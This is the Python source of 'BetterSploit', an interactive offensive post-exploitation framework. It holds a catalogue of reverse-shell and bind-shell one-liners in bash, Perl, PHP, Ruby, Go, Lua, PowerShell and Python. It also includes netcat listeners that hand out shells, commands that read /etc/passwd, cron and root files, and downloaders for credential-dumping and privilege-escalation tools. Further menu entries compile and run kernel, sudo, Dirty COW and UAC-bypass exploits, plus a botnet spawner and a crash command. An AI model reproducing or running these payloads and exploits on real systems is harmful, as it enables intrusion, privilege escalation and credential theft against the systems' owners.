#!/usr/bin/env python3
import subprocess as sub
import sys
import time
import requests
import os
from random import choice


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


tools = {
    1: "git clone https://github.com/pentestmonkey/windows-privesc-check.git",
    2: "git clone https://github.com/pentestmonkey/unix-privesc-check.git",
    3: "git clone https://github.com/mzet-/linux-exploit-suggester.git",
    4: "git clone https://github.com/bitsadmin/wesng.git",
    5: "git clone https://github.com/shawnduong/PXEnum.git",
    6: "git clone https://github.com/EmpireProject/Empire.git",
    7: "git clone https://github.com/huntergregal/mimipenguin.git",
    8: "git clone https://github.com/nilotpalbiswas/Auto-Root-Exploit.git",
    9: "git clone https://github.com/TheSecondSun/Bashark.git",
    10: "wget http://www.securitysift.com/download/linuxprivchecker.py",
    11: "pip3 install one-lin3r",
}


def escalate():
    print(f"( {Colors.green}Attempting To Escalate Privileges To Root{Colors.end} )")
    os.chdir("BetterSploit/internals/escalate")
    sub.call("python3 escalate_run.py", shell=True)


def make_banner_directory():
    try:
        os.mkdir("BetterSploit/BannersForBetterSploit")
        if FileExistsError:
            pass
    except FileNotFoundError:
        pass
    except FileExistsError:
        pass


def tool_shed():
    print(f"""
{Colors.red}╔═════════════════════════════════════════════════════════════════════════════════════════╗
{Colors.red}║{Colors.end}    #    Tool                                Description                                 {Colors.red}║
{Colors.red}║{Colors.end}    -    ----                                -----------                                 {Colors.red}║
{Colors.red}║{Colors.end}    1    Windows-Privesc-Check               Windows Privilege Escalation Checker        {Colors.red}║
{Colors.red}║{Colors.end}    2    Unix-Privesc-Check                  Unix Privilege Escalation Checker           {Colors.red}║
{Colors.red}║{Colors.end}    3    Linux-Exploit-Suggester             Linux Exploit Suggester                     {Colors.red}║
{Colors.red}║{Colors.end}    4    Windows Exploit Suggester           Windows Exploit Suggester                   {Colors.red}║
{Colors.red}║{Colors.end}    5    PXEnum                              Post Exploitation Enumeration               {Colors.red}║
{Colors.red}║{Colors.end}    6    MimiPenguin                         Dump The Login Password                     {Colors.red}║
{Colors.red}║{Colors.end}    7    PowerShell Empre                    Post-Exploitation Framework                 {Colors.red}║
{Colors.red}║{Colors.end}    8    Auto-Root-Exploit                   Auto Root Exploiter                         {Colors.red}║ 
{Colors.red}║{Colors.end}    9    BasShark                            Post exploitation toolkit                   {Colors.red}║
{Colors.red}║{Colors.end}    10   LinEnum                             Linux Enumeration Tool                      {Colors.red}║ 
{Colors.red}║{Colors.end}    11   One-Lin3r                           Framework For One Liner Payloads            {Colors.red}║
{Colors.red}╚═════════════════════════════════════════════════════════════════════════════════════════╝{Colors.end}\n""")


def escalator_shell():
    try:
        arg = sys.argv[1]
        enumeration = {
            1: "cat /etc/passwd",
            2: "id",
            3: """cat /etc/passwd | egrep -e '/bin/(ba)?sh'""",
            4: "ls -l /etc/passed",
            5: "sudo -l",
            6: "uname -a",
            7: "ls -l /root",
            8: "ls -la /home",
            9: "find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w -ls 2> /dev/null",
            10: "find / -path /sys -prune -o -path /proc -prune -o -type d -perm -o=w -ls 2> /dev/null",
            11: """find / -name "*.txt" -ls 2> /dev/null""",
            12: """find / -name "*.log" -ls 2> /dev/null""",
            13: "ps -aux | grep root",
            14: "netstat -a | grep -i listen",
            15: "netstat -ano",
            16: "crontab -l",
            17: "ls -alh /var/spool/cron",
            18: "ls -al /etc/ | grep cron",
            19: "ls -al /etc/cron*",
            20: "cat /etc/cron*",
            21: "cat /etc/at.allow",
            22: "cat /etc/at.deny",
            23: "cat /etc/cron.allow",
            24: "cat /etc/cron.deny",
            25: "cat /etc/crontab",
            26: "cat /etc/anacrontab",
            27: "cat /var/spool/cron/crontabs/root",
            29: "arp -e",
        }
        if arg == "--escalator" or arg == "--Escalator":
            def multi():
                sub.call("clear", shell=True)
                banner_choice = "cat BetterSploit/BannersForBetterSploit/BetterSploitEscalator2.txt | lolcat -a -d 5 --seed 55"
                os.system(banner_choice)
                while True:
                    escalator = input(
                        f"""{Colors.purple}┌─[ {Colors.red}Better{Colors.end}{Colors.purple}@{Colors.red}Sploit ({Colors.green}Escalator{Colors.end}{Colors.red}){Colors.purple} ] 
└──╼:>  {Colors.end}""")
                    print("\n")
                    if escalator == "help" or escalator == "?":
                        print(f"""
{Colors.red}╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
{Colors.red}║{Colors.end}    Command                 Description                                                        {Colors.red}║
{Colors.red}║{Colors.end}    -------                 -----------                                                        {Colors.red}║
{Colors.red}║{Colors.end}    exit                    Exit The Escalator                                                 {Colors.red}║
{Colors.red}║{Colors.end}    clear                   Clear The Screen                                                   {Colors.red}║
{Colors.red}║{Colors.end}    reverse_shells          Display A List Of Reverse Shells                                   {Colors.red}║
{Colors.red}║{Colors.end}    bind_shells             Display A List Of Bind Shells                                      {Colors.red}║
{Colors.red}║{Colors.end}    tools                   Display The Tool Shed                                              {Colors.red}║
{Colors.red}║{Colors.end}    network                 Enumerate The System For Live Sockets                              {Colors.red}║
{Colors.red}║{Colors.end}    ssh_pivot               Pivot Through The Network Via SSH                                  {Colors.red}║
{Colors.red}║{Colors.end}    escalate                Escalate Privileges To Root                                        {Colors.red}║
{Colors.red}║{Colors.end}    spawn_net               Spawn A Small Botnet Able To Accept 300 Connections                {Colors.red}║
{Colors.red}║{Colors.end}    enum                    Display System Enumeration Options                                 {Colors.red}║
{Colors.red}║{Colors.end}    shell                   Spawn A System Shell                                               {Colors.red}║
{Colors.red}║{Colors.end}    banner                  Display Banner                                                     {Colors.red}║
{Colors.red}║{Colors.end}    sysinfo                 Enumerate The System                                               {Colors.red}║
{Colors.red}║{Colors.end}    download (tool)         Used To Download Tools From The Tool Shed                          {Colors.red}║
{Colors.red}║{Colors.end}    use                     Use Any Module Or Option, ex: use linux/awk/bind_tcp or #          {Colors.red}║
{Colors.red}║{Colors.end}    crash                   Crash The Computer                                                 {Colors.red}║
{Colors.red}║{Colors.end}    abusesudo               AbuseSudo Script (Meant For Broken Sudo Configuration)             {Colors.red}║
{Colors.red}╚═══════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.end}
{Colors.end}\n""")
                    elif escalator == "sysinfo":
                        out_file = input(f"{Colors.red}(System Information Dump){Colors.end} [Enter Out File]:~#")
                        sub.call(f"python3 BetterSploit/modules/local-enumerator.py --enumerate {out_file}", shell=True)
                    elif escalator == "spawn_net":
                        local_host = input(f"{Colors.red}(Spawn Net){Colors.end} [Enter Local Host]:~#")
                        local_port = input(f"{Colors.red}(Spawn Net){Colors.end} [Enter Local Port]:~#")
                        sub.call(f"python3 BetterSploit/internals/BetterNet.py {local_host} {local_port}", shell=True)
                    elif escalator == "ssh_pivot":
                        sub.call("python3 BetterSploit/modules/SSH-module-pivot.py", shell=True)
                    elif escalator == "network":
                        os.system("python3 BetterSploit/modules/SSH-module-pivot.py enumerate")
                    elif escalator == "abusesudo":
                        os.chdir("BetterSploit/internals")
                        os.system("python3 AbuseSudo.py")
                    elif escalator == "download Windows-Privesc-Check" or escalator == "download 1":
                        sub.call(tools[1], shell=True)
                    elif escalator == "crash":
                        os.system("python -c 'print('asdnaspdspaubdapisdubasiubdasuipbdapuisbdpaibud' * 500000000)'")
                    elif escalator == "escalate":
                        escalate()
                    elif escalator == "download Unix-Privesc-Check" or escalator == "download 2":
                        sub.call(tools[2], shell=True)
                    elif escalator == "download Linux-Exploit-Suggester" or escalator == "download 3":
                        sub.call(tools[3], shell=True)
                    elif escalator == "download Windows Exploit Suggester" or escalator == "download 4":
                        sub.call(tools[4], shell=True)
                    elif escalator == "download PXEnum" or escalator == "download 5":
                        sub.call(tools[5], shell=True)
                    elif escalator == "download MimiPenguin" or escalator == "download 6":
                        sub.call(tools[7], shell=True)
                    elif escalator == "download PowerShell Empre" or escalator == "download 7":
                        sub.call(tools[6], shell=True)
                    elif escalator == "download Auto-Root-Exploit" or escalator == "download 8":
                        sub.call(tools[8], shell=True)
                    elif escalator == "download BasShark" or escalator == "download 9":
                        sub.call(tools[9], shell=True)
                    elif escalator == "download LinEnum" or escalator == "download 10":
                        sub.call(tools[10], shell=True)
                    elif escalator == "download One-Lin3r" or escalator == "download 11":
                        sub.call(tools[11], shell=True)
                    elif escalator == "clear":
                        sub.call("clear", shell=True)
                    elif escalator == "tools":
                        tool_shed()
                    elif escalator == "shell":
                        try:
                            sub.call("/bin/bash", shell=True)
                        except Exception:
                            sub.call("/bin/sh", shell=True)
                    elif escalator == "banner":
                        os.system(banner_choice)
                    elif escalator == "enum":
                        print(f"""
{Colors.red}╔═════════════════════════════════════════════════════════════════════════════════╗
{Colors.red}║{Colors.end}    Command                          Description                                 {Colors.red}║
{Colors.red}║{Colors.end}    --------                         -----------                                 {Colors.red}║
{Colors.red}║{Colors.end}    check_arp                        Display Arp Entries                         {Colors.red}║
{Colors.red}║{Colors.end}    check_cron                       Cron Job Check                              {Colors.red}║
{Colors.red}║{Colors.end}    check_sock                       Check For Processes With Listening Sockets  {Colors.red}║
{Colors.red}║{Colors.end}    check_root                       Check For Root Level Processes              {Colors.red}║
{Colors.red}║{Colors.end}    check_file                       Look For Interesting Files                  {Colors.red}║
{Colors.red}║{Colors.end}    check_write                      Check For World Writeable Directories       {Colors.red}║
{Colors.red}║{Colors.end}    check_home                       Check /home Persmissions                    {Colors.red}║
{Colors.red}║{Colors.end}    check_root_perms                 Check /root Persmissions                    {Colors.red}║
{Colors.red}║{Colors.end}    check_os                         Check Operating System Info                 {Colors.red}║       
{Colors.red}║{Colors.end}    check_sudo                       Check for Sudo Privs                        {Colors.red}║    
{Colors.red}║{Colors.end}    check_passwd                     View Permissions On Passwd                  {Colors.red}║ 
{Colors.red}║{Colors.end}    check_shell                      Print only users who have shell access      {Colors.red}║ 
{Colors.red}║{Colors.end}    check_groups                     Display Group Info                          {Colors.red}║
{Colors.red}║{Colors.end}    check_passwords                  Show Passwords File                         {Colors.red}║
{Colors.red}╚═════════════════════════════════════════════════════════════════════════════════╝{Colors.end}
\n""")
                    elif escalator == "check_arp":
                        sub.call(enumeration[29], shell=True)
                    elif escalator == "check_root_perms":
                        sub.call(enumeration[7], shell=True)
                    elif escalator == "check_os":
                        sub.call(enumeration[6], shell=True)
                    elif escalator == "check_sudo":
                        sub.call(enumeration[5], shell=True)
                    elif escalator == "check_passwd":
                        sub.call(enumeration[4], shell=True)
                    elif escalator == "check_shell":
                        sub.call(enumeration[3], shell=True)
                    elif escalator == "check_groups":
                        sub.call(enumeration[2], shell=True)
                    elif escalator == "check_passwords":
                        sub.call(enumeration[1], shell=True)
                    elif escalator == "check_cron":
                        print(Colors.green + "Checking Crontab..." + Colors.end)
                        sub.call(enumeration[16], shell=True)
                        time.sleep(3)
                        print(Colors.green + "Trying To Grab Cron Info..." + Colors.end)
                        time.sleep(5)
                        try:
                            sub.call(enumeration[17], shell=True)
                            sub.call(enumeration[18], shell=True)
                            sub.call(enumeration[19], shell=True)
                            sub.call(enumeration[20], shell=True)
                            sub.call(enumeration[21], shell=True)
                            sub.call(enumeration[22], shell=True)
                            sub.call(enumeration[23], shell=True)
                            sub.call(enumeration[24], shell=True)
                            sub.call(enumeration[25], shell=True)
                            sub.call(enumeration[26], shell=True)
                            sub.call(enumeration[27], shell=True)
                        except PermissionError:
                            print("Could Not Grab Info Becuase Of A Permission Error...")
                    elif escalator == "check_sock":
                        sub.call(enumeration[14], shell=True)
                        sub.call(enumeration[15], shell=True)
                    elif escalator == "check_root":
                        sub.call(enumeration[13], shell=True)
                    elif escalator == "check_file":
                        sub.call(enumeration[11], shell=True)
                        sub.call(enumeration[12], shell=True)
                    elif escalator == "check_write":
                        sub.call(enumeration[10], shell=True)
                    elif escalator == "check_home":
                        sub.call(enumeration[8], shell=True)
                    elif escalator == "shell":
                        try:
                            sub.call("/bin/bash", shell=True)
                        except Exception:
                            sub.call("/bin/sh", shell=True)
                    elif escalator == "reverse_shells":
                        print(f"""
{Colors.red}╔════════════════════════════════════════════════════════════════════════════════════════════╗
{Colors.red}║{Colors.end}    Name                                         Description                                {Colors.red}║  
{Colors.red}║{Colors.end}    ----------                                   ------------                               {Colors.red}║
{Colors.red}║{Colors.end}    linux/bash/reverse_tcp                       Linux Bash Reverse Shell (TCP)             {Colors.red}║
{Colors.red}║{Colors.end}    linux/go/reverse_tcp                         Linux Golang Reverse Shell (TCP)           {Colors.red}║
{Colors.red}║{Colors.end}    linux/java/reverse_tcp                       Linux Java Reverse Shell (TCP)             {Colors.red}║ 
{Colors.red}║{Colors.end}    linux/lua/reverse_tcp_bash                   Linux Lua Reverse Shell (TCP)              {Colors.red}║
{Colors.red}║{Colors.end}    linux/ncat/reverse_tcp                       Linux Netcat Reverse Shell (TCP)           {Colors.red}║
{Colors.red}║{Colors.end}    linux/perl/reverse_tcp                       Linux Perl Reverse Shell (TCP)             {Colors.red}║
{Colors.red}║{Colors.end}    linux/php/reverse_tcp                        Linux PHP Reverse Shell (TCP)              {Colors.red}║
{Colors.red}║{Colors.end}    linux/ruby/reverse_tcp                       Linux Ruby Reverse Shell (TCP)             {Colors.red}║
{Colors.red}║{Colors.end}    windows/powershell/reverse_tcp               Windows Powershell Reverse Shell (TCP)     {Colors.red}║
{Colors.red}║{Colors.end}    windows/python/reverse_tcp                   Windows Python Reverse Shell (TCP)         {Colors.red}║
{Colors.red}║{Colors.end}    windows/ruby/reverse_tcp                     Windows Ruby Reverse Shell (TCP)           {Colors.red}║
{Colors.red}╚════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.end}
\n""")
                    elif escalator == "use Linux/bash/reverse_tcp":
                        print("""
bash -i >& /dev/tcp/TARGET/PORT 0>&1""")
                    elif escalator == "use linux/go/reverse_tcp":
                        print("""
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","TARGET:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""")
                    elif escalator == "use linux/java/reverse_tcp":
                        print(r"""
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/TARGET/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()\n""")
                    elif escalator == "use linux/lua/reverse_tcp_bash":
                        print("""
lua -e "require('socket');require('os');t=socket.tcp();t:connect('TARGET','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')\n""")
                    elif escalator == "use linux/ncat/reverse_tcp":
                        print("""
ncat TARGET PORT -e /bin/bash""")
                    elif escalator == "use linux/perl/reverse_tcp":
                        print("""
perl -e 'use Socket;$i="TARGET";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
                    elif escalator == "use linux/php/reverse_tcp":
                        print("""
php -r '$sock=fsockopen("TARGET",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'""")
                    elif escalator == "use linux/ruby/reverse_tcp":
                        print('''
ruby -rsocket -e "exit if fork;s=TCPSocket.new('TARGET',PORT);while(s.print 'shell>';s2=s.gets);IO.popen(s2,'r'){|s3|s.print s3.read}end"''')
                    elif escalator == "use windows/powershell/reverse_tcp":
                        print('''
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("TARGET",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''')
                    elif escalator == "use windows/python/reverse_tcp":
                        print("""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TARGET",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("cmd");'""")
                    elif escalator == "use windows/ruby/reverse_tcp":
                        print("""
ruby -rsocket -e 'c=TCPSocket.new("TARGET","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""")
                    elif escalator == "exit":
                        print(f"{Colors.red}[||]... GoodBye ...[||]{Colors.end}")
                        exit(0)
                    elif escalator == "bind_shells":
                        print(f"""
{Colors.purple}Name                                   Description
---------                              --------------{Colors.red}
linux/awk/bind_tcp                     AWK Bind Shell
linux/nc/bind_tcp                      NetCat Bind Shell
windows/perl/bind_tcp                  Windows Perl Bind Shell
windows/python/bind_udp                Windows Python Bind Shell
{Colors.end}
""")
                    elif escalator == "use linux/nc/bind_tcp":
                        print(f"""
nc -lvp PORT -e /bin/bash""")
                    elif escalator == "use linux/awk/bind_tcp":
                        print("""
VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/tcp/"VAR2"/0/0";for(;VAR3|&getline VAR4;close(VAR4))while(VAR4|getline)print|&VAR3;close(VAR3)}'""")
                    elif escalator == "use windows/perl/bind_tcp":
                        print("""
perl -MIO::Socket::INET -e '$|=1;$VAR1=new IO::Socket::INET->new();$VAR1 = new IO::Socket::INET(LocalPort => PORT,Proto => "tcp");while(NUM1){ $VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'""")
                    elif escalator == "use windows/python/bind_udp":
                        print("""
python -c 'while NUM1: from subprocess import Popen,PIPE;from socket import socket,AF_INET,SOCK_DGRAM;VAR1=socket(AF_INET,SOCK_DGRAM);VAR1.bind(("0.0.0.0",PORT));VAR2,VAR3=VAR1.recvfrom(8096);VAR4=Popen(VAR2,shell=True,stdout=PIPE,stderr=PIPE).communicate();VAR1.sendto("".join([VAR4[0],VAR4[1]]),VAR3)'""")
                    else:
                        try:
                            print(f"\r{Colors.green}{escalator} :{Colors.end}")
                            sub.call(escalator, shell=True)
                        except Exception as Error:
                            print(Error)

            if __name__ == '__main__':
                def making_escalate_banner():
                    try:
                        other_banner = open("BetterSploit/BannersForBetterSploit/BetterSploitEscalator2.txt",
                                            "w")
                        other_banner.write("""
                                ┌─┐┌─┐┌─┐┌─┐┬  ┌─┐┌┬┐┌─┐┬─┐
                                ├┤ └─┐│  ├─┤│  ├─┤ │ │ │├┬┘
                                └─┘└─┘└─┘┴ ┴┴─┘┴ ┴ ┴ └─┘┴└─\n\n\n""")
                        other_banner.close()
                    except FileExistsError:
                        pass

                making_escalate_banner()
                multi()

    except KeyboardInterrupt:
        exit(0)
    except IndexError:
        pass


escalator_shell()


def listener():
    def netcat():
        windows_or_linux = input(
            f"{Colors.blue}[ Windows{Colors.end}{Colors.purple}~Or~{Colors.red}Linux?{Colors.blue} ] >  {Colors.end}")
        if windows_or_linux == "linux" or windows_or_linux == "Linux":
            try:
                sub.call("nc -nvlp 6996 -e /bin/bash", shell=True)
            except ConnectionRefusedError:
                print(f"{Colors.purple} [-]  Connection Was Failed  [-]{Colors.end}")
        elif windows_or_linux == "Windows" or windows_or_linux == "windows":
            try:
                sub.call("nc -nvlp 6996 -e powershell.exe", shell=True)
            except Exception:
                sub.call("nc -nvlp 6996 -e cmd.exe", shell=True)

    if __name__ == '__main__':
        netcat()


def bettersploit_framework():
    try:
        os.mkdir("BetterSploit/modules")
    except FileNotFoundError:
        pass
    except FileExistsError:
        pass
    try:
        os.chdir("BetterSploit/modules")
    except FileNotFoundError:
        pass
    count = 0
    while True:
        fancy_shell = input(
            f"""{Colors.red}[ {Colors.purple}Better{Colors.red}@{Colors.purple}Sploit{Colors.red} ]:~#{Colors.end}""")
        if fancy_shell == "help" or fancy_shell == "?":
            print(f"""
{Colors.red}╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗{Colors.end}
{Colors.red}║ {Colors.end}Command                 Description                                                                    {Colors.red}║
{Colors.red}║ {Colors.end}-------                 -----------                                                                    {Colors.red}║
{Colors.red}║ {Colors.end}?/help                  Display This Menu                                                              {Colors.red}║
{Colors.red}║ {Colors.end}listen                  Listen For Incoming Connections                                                {Colors.red}║
{Colors.red}║ {Colors.end}banner                  Display A Dope Ass Banner                                                      {Colors.red}║
{Colors.red}║ {Colors.end}clear                   Clear The Console                                                              {Colors.red}║
{Colors.red}║ {Colors.end}exit                    Exit The Framework                                                             {Colors.red}║
{Colors.red}║ {Colors.end}show                    show exploits, modules, etc                                                    {Colors.red}║
{Colors.red}║ {Colors.end}$ (command)             Execute A System Command                                                       {Colors.red}║
{Colors.red}║ {Colors.end}options                 See Options For An Exploit Or Module (Some May Not Have This Option)           {Colors.red}║
{Colors.red}║{Colors.end} back                    Back Out Of An Exploit Or Module                                               {Colors.red}║
{Colors.red}║{Colors.end} search                  Search Exploits for A Keyword                                                  {Colors.red}║
{Colors.red}║{Colors.end} details (name/number)   Grab Details For Any Module On The Framework                                   {Colors.red}║
{Colors.red}║{Colors.end} set (variable)          Set A Variable Inside A Module                                                 {Colors.red}║
{Colors.red}║{Colors.end} use (module)            Use Module (local)                                                             {Colors.red}║
{Colors.red}║{Colors.end} http                    Start A Simple HTTP Server                                                     {Colors.red}║
{Colors.red}║{Colors.end} screen                  Display The Loading Screen Again                                               {Colors.red}║
{Colors.red}║{Colors.end} escalator               Open The Escalator                                                             {Colors.red}║
{Colors.red}║{Colors.end} char gen (integer)      Generate Any Amount Of Charachters (for payload development)                   {Colors.red}║
{Colors.red}║ {Colors.end}                                                                                                       {Colors.red}║
{Colors.red}║ {Colors.end}module                  Description                                                                    {Colors.red}║
{Colors.red}║ {Colors.end}------                  -----------                                                                    {Colors.red}║
{Colors.red}║ {Colors.end}msfvenom                Enter Msfvenom Shell And Work From There (type exit to exit) or (type example) {Colors.red}║
{Colors.red}║ {Colors.end}shellcode               Query And Download From A Shellcode Database                                   {Colors.red}║
{Colors.red}╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.end}""")
        elif fancy_shell == "banner":
            sub.call("cat ../BannersForBetterSploit/BetterSploit.txt |  lolcat -a -d 5 --seed 55", shell=True)
        elif "char gen " in fancy_shell:
            amount = fancy_shell[9:]
            charachters = "A", "B", "C", "D", "E", "F", "G", "K", "L", "M", "X"
            number = int(amount)
            for x in range(number):
                print(choice(charachters), end="")
            print(f"\n {Colors.green}Payload Created{Colors.end}")
        elif fancy_shell == "escalator":
            os.chdir("../../")
            exit(os.system("python3 BetterSploit.py --escalator"))
        elif fancy_shell == "show post" or fancy_shell == "show Post":
            def post():
                print(f"""
{Colors.red}╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{Colors.red}║{Colors.end}    Scripts                                                             Description                              {Colors.red}║
{Colors.red}║{Colors.end}    --------                                                            -----------                              {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/pentestmonkey/windows-privesc-check              Windows Privilege Escalation             {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/pentestmonkey/unix-privesc-check                 Unix Privilege Escalation                {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/mzet-/linux-exploit-suggester                    Linux Exploit Suggester                  {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/bitsadmin/wesng                                  Windows Exploit Suggester                {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/shawnduong/PXEnum                                Post Exploitation Enumeration            {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/EmpireProject/Empire                             PowerShell Empire                        {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/huntergregal/mimipenguin                         Dump The Login Passwords And Credentials {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/nilotpalbiswas/Auto-Root-Exploit                 Automate Root Exploit                    {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/EnigmaDimitri/LARE                               [L]ocal [A]uto [R]oot [E]xploiter        {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/TheSecondSun/Bashark                             Post exploitation toolkit                {Colors.red}║
{Colors.red}║{Colors.end}    https://github.com/rebootuser/LinEnum                               Linux Enumeration                        {Colors.red}║
{Colors.red}║{Colors.end}    http://www.securitysift.com/download/linuxprivchecker.py            Linux Privilege Escalation Checker       {Colors.red}║ 
{Colors.red}║{Colors.end}                                                                                                                 {Colors.red}║
{Colors.red}║{Colors.end}    name                                                    Description                                          {Colors.red}║
{Colors.red}║{Colors.end}    ------                                                  -----------                                          {Colors.red}║
{Colors.red}║{Colors.end}    Docker/Container/Escape                                 Escape From Docker Container                         {Colors.red}║
{Colors.red}║{Colors.end}    Linux-Kernel/local/Privilege-Escalation                 Local Privilege Escalation                           {Colors.red}║
{Colors.red}║{Colors.end}    GNU-Beep-1.3/HoleyBeep/Privilege-Escalation             Local Privilege Escalation                           {Colors.red}║
{Colors.red}║{Colors.end}    Windows-SMBv3-LPE-Exploit/CVE-2020-0796                 Windows Local Privilege Escalation        {Colors.red}║
{Colors.red}║{Colors.end}    python3-interpreter-arbitrary-code-execution            Arbitrary Code Execution                             {Colors.red}║
{Colors.red}║{Colors.end}    Sony-Playstation-4(PS4)<7.02/FreeBSD<12/'ip6_setpktopt' Kernel Exploit Privilege Escalation                  {Colors.red}║
{Colors.red}║{Colors.end}    Local-Linux-Enumeration                                 Local-Enumeration                                    {Colors.red}║
{Colors.red}║{Colors.end}    Spawn-BetterNet                                         Botnet Able To Recieve 300 Connections               {Colors.red}║
{Colors.red}║{Colors.end}    Windows-10/UAC-BYPASS                                   Local Privilege Escalation / Bypass                  {Colors.red}║
{Colors.red}║{Colors.end}    Linux-Kernel/3.9-(x86/x64)/'Dirty-COW'-LPE/SUID Method  Local Privilege Escalation                           {Colors.red}║
{Colors.red}║{Colors.end}    ASAN-SUID-LPE                                           Local Privilege Escalation                           {Colors.red}║
{Colors.red}║{Colors.end}    Linux-Kernel/5.3/LPE/via-io_uring-Offload-sendmsg()     Local Privilege Escalation                           {Colors.red}║
{Colors.red}║{Colors.end}    Sudo/1.8.6p7-1.8.20/LPE                                 Local Privilege Escalation                           {Colors.red}║
{Colors.red}║{Colors.end}    Linux-kernel<4.5/LPE                                    Local Privilege Escalation                           {Colors.red}║
{Colors.red}╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{Colors.end}\n""")

            post()
        elif fancy_shell == "use Spawn-BetterNet":
            local_host1 = input(f"{Colors.red}(Spawn Net){Colors.end} [Enter Local Port]:~#")
            local_port2 = input(f"{Colors.red}(Spawn Net){Colors.end} [Enter Local Port]:~#")
            sub.call(f"python3 ../internals/BetterNet.py {local_host1} {local_port2}", shell=True)
        elif fancy_shell == "use Linux-kernel<4.5/LPE":
            sub.call("gcc kernel-exploit.c -o kernel-exploitz;./ kernel-exploitz;rm kernel-exploitz", shell=True)
        elif fancy_shell == "use Sudo/1.8.6p7-1.8.20/LPE":
            sub.call("gcc -o sudopwn sudopwn.c -lutil;./sudopwn;rm sudopwn", shell=True)
        elif fancy_shell == "use Linux-Kernel/5.3/LPE/via-io_uring-Offload-sendmsg()":
            sub.call("gcc -Wall -pthread -o uring_sendmsg ../internals/escalate/kernel-exploit-5.3.c;./uring_sendmsg;rm uring_sendmsg", shell=True)
        elif fancy_shell == "use ASAN-SUID-LPE":
            sub.call("python3 asan-module.py", shell=True)
        elif fancy_shell == "use Linux-Kernel/3.9-(x86/x64)/'Dirty-COW'-LPE/SUID Method":
            sub.call("gcc dirtycow.c -o dirty;./dirty;rm dirty", shell=True)
        elif fancy_shell == "use Windows-10/UAC-BYPASS":
            sub.call("python3 windows10-uac-bypass.py", shell=True)
        elif fancy_shell == "use Windows-SMBv3-LPE-Exploit/CVE-2020-0796":
            where = input(
                f"{Colors.red}(Windows SMBv3 LPE Exploit CVE-2020-0796){Colors.end} [Where Would You Like To Move The File (Example: /home/user)]:~#")
            sub.call(f"mv ../local/CVE-2020-0796 {where}", shell=True)
        elif fancy_shell == "use Sony-Playstation-4(PS4)<7.02/FreeBSD<12/'ip6_setpktopt'":
            sub.call("clang -o Sony-Exploit ../exploitz/PS4<7.02-&-FreeBSD<12-Kernel-Exploit.c -lpthread", shell=True)
            sub.call("./exploit", shell=True)
        elif fancy_shell == "use python3-interpreter-arbitrary-code-execution":
            print('''
  quick POC of how you can get command execution from the python3 interpreter
   (QUICK POC): [command line]
       command 1: python3
       command 2: __import__('os').system('id')
  real POC
 _____________________________________________________________________________________''')
        elif fancy_shell == "use Docker/Container/Escape":
            print(f"{Colors.red}cat /usr/share/exploitdb/exploits/linux/local/47147.txt{Colors.end}")
            sub.call("cat /usr/share/exploitdb/exploits/linux/local/47147.txt", shell=True)
        elif fancy_shell == "use Local-Linux-Enumeration":
            out_file = input(f"{Colors.red}(Local-Linux-Enumeration){Colors.end} [Enter Out File]:~#")
            sub.call(f"python3 local-enumerator.py --enumerate {out_file}", shell=True)
        elif fancy_shell == "use GNU-Beep-1.3/HoleyBeep/Privilege-Escalation":
            print("python /usr/share/exploitdb/exploits/linux/local/44452.py -h")
            sub.call("python /usr/share/exploitdb/exploits/linux/local/44452.py -h", shell=True)
        elif fancy_shell == "use Linux-Kernel/local/Privilege-Escalation":
            print(
                f"{Colors.red}gcc /usr/share/exploitdb/exploits/linux_x86/local/42276.c - Exploit_Priv_Esc;./Exploit_Priv_Esc{Colors.end}")
            sub.call("gcc /usr/share/exploitdb/exploits/linux_x86/local/42276.c -o Exploit_Priv_Esc", shell=True)
            sub.call("./Exploit_Priv_Esc", shell=True)
